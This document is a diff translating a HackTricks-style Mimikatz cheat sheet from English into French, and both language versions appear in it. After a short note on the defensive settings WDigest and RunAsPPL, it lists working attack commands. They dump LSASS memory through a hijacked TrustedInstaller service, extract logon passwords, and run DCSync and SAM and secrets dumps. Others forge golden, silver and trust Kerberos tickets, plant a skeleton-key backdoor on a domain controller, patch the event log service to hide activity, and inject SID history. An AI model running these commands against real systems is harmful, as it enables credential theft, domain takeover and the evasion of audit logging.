@@ -4,220 +4,209 @@
 
 <figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>
 
-Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:
+Approfondissez votre expertise en **Mobile Security** avec 8kSec Academy. Maîtrisez la sécurité iOS et Android grâce à nos cours à votre rythme et obtenez une certification :
 
 {% embed url="https://academy.8ksec.io/" %}
 
-**This page is based on one from [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Check the original for further info!
+**Cette page est basée sur une de [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Consultez l'original pour plus d'infos !
 
-## LM and Clear-Text in memory
+## LM et mots de passe en clair en mémoire
 
-From Windows 8.1 and Windows Server 2012 R2 onwards, significant measures have been implemented to safeguard against credential theft:
+Depuis Windows 8.1 et Windows Server 2012 R2, des mesures significatives ont été mises en œuvre pour protéger contre le vol de credentials :
 
-- **LM hashes and plain-text passwords** are no longer stored in memory to enhance security. A specific registry setting, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ must be configured with a DWORD value of `0` to disable Digest Authentication, ensuring "clear-text" passwords are not cached in LSASS.
+- **Les hachages LM et les mots de passe en clair** ne sont plus stockés en mémoire pour améliorer la sécurité. Un paramètre de registre spécifique, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ doit être configuré avec une valeur DWORD de `0` pour désactiver l'authentification Digest, garantissant que les mots de passe "en clair" ne sont pas mis en cache dans LSASS.
 
-- **LSA Protection** is introduced to shield the Local Security Authority (LSA) process from unauthorized memory reading and code injection. This is achieved by marking the LSASS as a protected process. Activation of LSA Protection involves:
-  1. Modifying the registry at _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ by setting `RunAsPPL` to `dword:00000001`.
-  2. Implementing a Group Policy Object (GPO) that enforces this registry change across managed devices.
+- **La protection LSA** est introduite pour protéger le processus de l'Autorité de Sécurité Locale (LSA) contre la lecture non autorisée de la mémoire et l'injection de code. Cela est réalisé en marquant LSASS comme un processus protégé. L'activation de la protection LSA implique :
+1. Modifier le registre à _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ en définissant `RunAsPPL` à `dword:00000001`.
+2. Mettre en œuvre un objet de stratégie de groupe (GPO) qui impose ce changement de registre sur les appareils gérés.
 
-Despite these protections, tools like Mimikatz can circumvent LSA Protection using specific drivers, although such actions are likely to be recorded in event logs.
+Malgré ces protections, des outils comme Mimikatz peuvent contourner la protection LSA en utilisant des pilotes spécifiques, bien que de telles actions soient susceptibles d'être enregistrées dans les journaux d'événements.
 
-### Counteracting SeDebugPrivilege Removal
+### Contrebalancer la suppression de SeDebugPrivilege
 
-Administrators typically have SeDebugPrivilege, enabling them to debug programs. This privilege can be restricted to prevent unauthorized memory dumps, a common technique used by attackers to extract credentials from memory. However, even with this privilege removed, the TrustedInstaller account can still perform memory dumps using a customized service configuration:
-
+Les administrateurs ont généralement SeDebugPrivilege, leur permettant de déboguer des programmes. Ce privilège peut être restreint pour empêcher les dumps de mémoire non autorisés, une technique courante utilisée par les attaquants pour extraire des credentials de la mémoire. Cependant, même avec ce privilège supprimé, le compte TrustedInstaller peut toujours effectuer des dumps de mémoire en utilisant une configuration de service personnalisée :
 ```bash
 sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
 sc start TrustedInstaller
 ```
-
-This allows the dumping of the `lsass.exe` memory to a file, which can then be analyzed on another system to extract credentials:
-
+Cela permet de vider la mémoire de `lsass.exe` dans un fichier, qui peut ensuite être analysé sur un autre système pour extraire des identifiants :
 ```
 # privilege::debug
 # sekurlsa::minidump lsass.dmp
 # sekurlsa::logonpasswords
 ```
+## Options Mimikatz
 
-## Mimikatz Options
+La falsification des journaux d'événements dans Mimikatz implique deux actions principales : effacer les journaux d'événements et patcher le service d'événements pour empêcher l'enregistrement de nouveaux événements. Voici les commandes pour effectuer ces actions :
 
-Event log tampering in Mimikatz involves two primary actions: clearing event logs and patching the Event service to prevent logging of new events. Below are the commands for performing these actions:
+#### Effacement des journaux d'événements
 
-#### Clearing Event Logs
+- **Commande** : Cette action vise à supprimer les journaux d'événements, rendant plus difficile le suivi des activités malveillantes.
+- Mimikatz ne fournit pas de commande directe dans sa documentation standard pour effacer les journaux d'événements directement via sa ligne de commande. Cependant, la manipulation des journaux d'événements implique généralement l'utilisation d'outils système ou de scripts en dehors de Mimikatz pour effacer des journaux spécifiques (par exemple, en utilisant PowerShell ou le Visualiseur d'événements Windows).
 
-- **Command**: This action is aimed at deleting the event logs, making it harder to track malicious activities.
-- Mimikatz does not provide a direct command in its standard documentation for clearing event logs directly via its command line. However, event log manipulation typically involves using system tools or scripts outside of Mimikatz to clear specific logs (e.g., using PowerShell or Windows Event Viewer).
+#### Fonctionnalité expérimentale : Patchage du service d'événements
 
-#### Experimental Feature: Patching the Event Service
+- **Commande** : `event::drop`
+- Cette commande expérimentale est conçue pour modifier le comportement du service d'enregistrement des événements, empêchant effectivement l'enregistrement de nouveaux événements.
+- Exemple : `mimikatz "privilege::debug" "event::drop" exit`
 
-- **Command**: `event::drop`
-- This experimental command is designed to modify the Event Logging Service's behavior, effectively preventing it from recording new events.
-- Example: `mimikatz "privilege::debug" "event::drop" exit`
+- La commande `privilege::debug` garantit que Mimikatz fonctionne avec les privilèges nécessaires pour modifier les services système.
+- La commande `event::drop` patch alors le service d'enregistrement des événements.
 
-- The `privilege::debug` command ensures that Mimikatz operates with the necessary privileges to modify system services.
-- The `event::drop` command then patches the Event Logging service.
+### Attaques de tickets Kerberos
 
-### Kerberos Ticket Attacks
+### Création de Golden Ticket
 
-### Golden Ticket Creation
+Un Golden Ticket permet une usurpation d'accès à l'échelle du domaine. Commande clé et paramètres :
 
-A Golden Ticket allows for domain-wide access impersonation. Key command and parameters:
+- Commande : `kerberos::golden`
+- Paramètres :
+- `/domain` : Le nom de domaine.
+- `/sid` : L'identifiant de sécurité (SID) du domaine.
+- `/user` : Le nom d'utilisateur à usurper.
+- `/krbtgt` : Le hachage NTLM du compte de service KDC du domaine.
+- `/ptt` : Injecte directement le ticket en mémoire.
+- `/ticket` : Enregistre le ticket pour une utilisation ultérieure.
 
-- Command: `kerberos::golden`
-- Parameters:
-  - `/domain`: The domain name.
-  - `/sid`: The domain's Security Identifier (SID).
-  - `/user`: The username to impersonate.
-  - `/krbtgt`: The NTLM hash of the domain's KDC service account.
-  - `/ptt`: Directly injects the ticket into memory.
-  - `/ticket`: Saves the ticket for later use.
-
-Example:
-
+Exemple :
 ```bash
 mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
 ```
+### Création de Silver Ticket
 
-### Silver Ticket Creation
+Les Silver Tickets accordent l'accès à des services spécifiques. Commande clé et paramètres :
 
-Silver Tickets grant access to specific services. Key command and parameters:
+- Commande : Semblable au Golden Ticket mais cible des services spécifiques.
+- Paramètres :
+- `/service` : Le service à cibler (par exemple, cifs, http).
+- Autres paramètres similaires au Golden Ticket.
 
-- Command: Similar to Golden Ticket but targets specific services.
-- Parameters:
-  - `/service`: The service to target (e.g., cifs, http).
-  - Other parameters similar to Golden Ticket.
-
-Example:
-
+Exemple :
 ```bash
 mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
 ```
+### Création de Ticket de Confiance
 
-### Trust Ticket Creation
+Les Tickets de Confiance sont utilisés pour accéder aux ressources à travers les domaines en tirant parti des relations de confiance. Commande clé et paramètres :
 
-Trust Tickets are used for accessing resources across domains by leveraging trust relationships. Key command and parameters:
+- Commande : Semblable au Golden Ticket mais pour les relations de confiance.
+- Paramètres :
+- `/target` : Le FQDN du domaine cible.
+- `/rc4` : Le hash NTLM pour le compte de confiance.
 
-- Command: Similar to Golden Ticket but for trust relationships.
-- Parameters:
-  - `/target`: The target domain's FQDN.
-  - `/rc4`: The NTLM hash for the trust account.
-
-Example:
-
+Exemple :
 ```bash
 mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
 ```
+### Commandes Kerberos supplémentaires
 
-### Additional Kerberos Commands
+- **Lister les tickets** :
 
-- **Listing Tickets**:
+- Commande : `kerberos::list`
+- Liste tous les tickets Kerberos pour la session utilisateur actuelle.
 
-  - Command: `kerberos::list`
-  - Lists all Kerberos tickets for the current user session.
+- **Passer le cache** :
 
-- **Pass the Cache**:
+- Commande : `kerberos::ptc`
+- Injecte des tickets Kerberos à partir de fichiers de cache.
+- Exemple : `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
 
-  - Command: `kerberos::ptc`
-  - Injects Kerberos tickets from cache files.
-  - Example: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
+- **Passer le ticket** :
 
-- **Pass the Ticket**:
+- Commande : `kerberos::ptt`
+- Permet d'utiliser un ticket Kerberos dans une autre session.
+- Exemple : `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
 
-  - Command: `kerberos::ptt`
-  - Allows using a Kerberos ticket in another session.
-  - Example: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
+- **Purger les tickets** :
+- Commande : `kerberos::purge`
+- Efface tous les tickets Kerberos de la session.
+- Utile avant d'utiliser des commandes de manipulation de tickets pour éviter les conflits.
 
-- **Purge Tickets**:
-  - Command: `kerberos::purge`
-  - Clears all Kerberos tickets from the session.
-  - Useful before using ticket manipulation commands to avoid conflicts.
+### Manipulation d'Active Directory
 
-### Active Directory Tampering
+- **DCShadow** : Faire temporairement agir une machine comme un DC pour la manipulation d'objets AD.
 
-- **DCShadow**: Temporarily make a machine act as a DC for AD object manipulation.
+- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
 
-  - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
+- **DCSync** : Imiter un DC pour demander des données de mot de passe.
+- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`
 
-- **DCSync**: Mimic a DC to request password data.
-  - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`
+### Accès aux informations d'identification
 
-### Credential Access
+- **LSADUMP::LSA** : Extraire des informations d'identification de LSA.
 
-- **LSADUMP::LSA**: Extract credentials from LSA.
+- `mimikatz "lsadump::lsa /inject" exit`
 
-  - `mimikatz "lsadump::lsa /inject" exit`
+- **LSADUMP::NetSync** : Usurper un DC en utilisant les données de mot de passe d'un compte d'ordinateur.
 
-- **LSADUMP::NetSync**: Impersonate a DC using a computer account's password data.
+- _Aucune commande spécifique fournie pour NetSync dans le contexte original._
 
-  - _No specific command provided for NetSync in original context._
+- **LSADUMP::SAM** : Accéder à la base de données SAM locale.
 
-- **LSADUMP::SAM**: Access local SAM database.
+- `mimikatz "lsadump::sam" exit`
 
-  - `mimikatz "lsadump::sam" exit`
+- **LSADUMP::Secrets** : Déchiffrer les secrets stockés dans le registre.
 
-- **LSADUMP::Secrets**: Decrypt secrets stored in the registry.
+- `mimikatz "lsadump::secrets" exit`
 
-  - `mimikatz "lsadump::secrets" exit`
+- **LSADUMP::SetNTLM** : Définir un nouveau hachage NTLM pour un utilisateur.
 
-- **LSADUMP::SetNTLM**: Set a new NTLM hash for a user.
+- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`
 
-  - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`
+- **LSADUMP::Trust** : Récupérer des informations d'authentification de confiance.
+- `mimikatz "lsadump::trust" exit`
 
-- **LSADUMP::Trust**: Retrieve trust authentication information.
-  - `mimikatz "lsadump::trust" exit`
+### Divers
 
-### Miscellaneous
+- **MISC::Skeleton** : Injecter un backdoor dans LSASS sur un DC.
+- `mimikatz "privilege::debug" "misc::skeleton" exit`
 
-- **MISC::Skeleton**: Inject a backdoor into LSASS on a DC.
-  - `mimikatz "privilege::debug" "misc::skeleton" exit`
+### Escalade de privilèges
 
-### Privilege Escalation
+- **PRIVILEGE::Backup** : Acquérir des droits de sauvegarde.
 
-- **PRIVILEGE::Backup**: Acquire backup rights.
+- `mimikatz "privilege::backup" exit`
 
-  - `mimikatz "privilege::backup" exit`
+- **PRIVILEGE::Debug** : Obtenir des privilèges de débogage.
+- `mimikatz "privilege::debug" exit`
 
-- **PRIVILEGE::Debug**: Obtain debug privileges.
-  - `mimikatz "privilege::debug" exit`
+### Dumping d'informations d'identification
 
-### Credential Dumping
+- **SEKURLSA::LogonPasswords** : Afficher les informations d'identification des utilisateurs connectés.
 
-- **SEKURLSA::LogonPasswords**: Show credentials for logged-on users.
+- `mimikatz "sekurlsa::logonpasswords" exit`
 
-  - `mimikatz "sekurlsa::logonpasswords" exit`
+- **SEKURLSA::Tickets** : Extraire des tickets Kerberos de la mémoire.
+- `mimikatz "sekurlsa::tickets /export" exit`
 
-- **SEKURLSA::Tickets**: Extract Kerberos tickets from memory.
-  - `mimikatz "sekurlsa::tickets /export" exit`
+### Manipulation de SID et de jetons
 
-### Sid and Token Manipulation
+- **SID::add/modify** : Changer SID et SIDHistory.
 
-- **SID::add/modify**: Change SID and SIDHistory.
+- Ajouter : `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
+- Modifier : _Aucune commande spécifique pour modifier dans le contexte original._
 
-  - Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
-  - Modify: _No specific command for modify in original context._
+- **TOKEN::Elevate** : Usurper des jetons.
+- `mimikatz "token::elevate /domainadmin" exit`
 
-- **TOKEN::Elevate**: Impersonate tokens.
-  - `mimikatz "token::elevate /domainadmin" exit`
+### Services Terminal
 
-### Terminal Services
+- **TS::MultiRDP** : Autoriser plusieurs sessions RDP.
 
-- **TS::MultiRDP**: Allow multiple RDP sessions.
+- `mimikatz "ts::multirdp" exit`
 
-  - `mimikatz "ts::multirdp" exit`
+- **TS::Sessions** : Lister les sessions TS/RDP.
+- _Aucune commande spécifique fournie pour TS::Sessions dans le contexte original._
 
-- **TS::Sessions**: List TS/RDP sessions.
-  - _No specific command provided for TS::Sessions in original context._
+### Coffre-fort
 
-### Vault
-
-- Extract passwords from Windows Vault.
-  - `mimikatz "vault::cred /patch" exit`
+- Extraire des mots de passe du Coffre-fort Windows.
+- `mimikatz "vault::cred /patch" exit`
 
 <figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>
 
-Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:
+Approfondissez votre expertise en **Sécurité Mobile** avec 8kSec Academy. Maîtrisez la sécurité iOS et Android grâce à nos cours à votre rythme et obtenez une certification :
 
 {% embed url="https://academy.8ksec.io/" %}
 
 {{#include ../../banners/hacktricks-training.md}}
-
